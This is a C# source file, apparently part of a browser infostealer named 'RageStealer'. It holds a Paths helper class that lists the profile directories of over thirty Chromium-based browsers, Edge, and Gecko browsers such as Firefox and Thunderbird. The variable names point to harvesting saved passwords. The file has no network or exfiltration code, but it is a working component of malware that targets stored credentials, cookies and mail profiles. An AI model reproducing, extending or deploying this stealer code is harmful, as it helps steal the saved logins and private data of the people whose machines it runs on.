using System;

namespace RageStealer.Helper;

internal class Paths
{
	public static string[] SChromiumPswPaths1 = new string[31]
	{
		"\\Opera Software", "\\Opera Software", "\\Chromium", "\\Google", "\\Google(x86)", "\\MapleStudio", "\\Iridium", "\\7Star", "\\CentBrowser", "\\Chedot",
		"\\Vivaldi", "\\Kometa", "\\Elements Browser", "\\Epic Privacy Browser", "\\uCozMedia", "\\Fenrir Inc", "\\CatalinaGroup", "\\Coowon", "\\liebao", "\\QIP Surf",
		"\\Orbitum", "\\Comodo", "\\Amigo", "\\Torch", "\\Yandex", "\\Comodo", "\\360Browser", "\\Maxthon3", "\\K-Melon", "\\CocCoc",
		"\\BraveSoftware"
	};

	public static string[] SChromiumPswPaths = new string[31]
	{
		"\\Opera Software\\Opera Stable\\", "\\Opera Software\\Opera GX Stable\\", "\\Chromium\\User Data\\", "\\Google\\Chrome\\User Data\\", "\\Google(x86)\\Chrome\\User Data\\", "\\MapleStudio\\ChromePlus\\User Data\\", "\\Iridium\\User Data\\", "\\7Star\\7Star\\User Data", "\\CentBrowser\\User Data", "\\Chedot\\User Data",
		"\\Vivaldi\\User Data", "\\Kometa\\User Data", "\\Elements Browser\\User Data", "\\Epic Privacy Browser\\User Data", "\\uCozMedia\\Uran\\User Data", "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer", "\\CatalinaGroup\\Citrio\\User Data", "\\Coowon\\Coowon\\User Data", "\\liebao\\User Data", "\\QIP Surf\\User Data",
		"\\Orbitum\\User Data", "\\Comodo\\Dragon\\User Data", "\\Amigo\\User\\User Data", "\\Torch\\User Data", "\\Yandex\\YandexBrowser\\User Data", "\\Comodo\\User Data", "\\360Browser\\Browser\\User Data", "\\Maxthon3\\User Data", "\\K-Melon\\User Data", "\\CocCoc\\Browser\\User Data",
		"\\BraveSoftware\\Brave-Browser\\User Data"
	};

	public static string EdgePath = "\\Microsoft\\Edge\\User Data";

	public static string[] SGeckoBrowserPaths = new string[6] { "\\Mozilla\\Firefox", "\\Waterfox", "\\K-Meleon", "\\Thunderbird", "\\Comodo\\IceDragon", "\\8pecxstudios\\Cyberfox" };

	public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string Lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
}
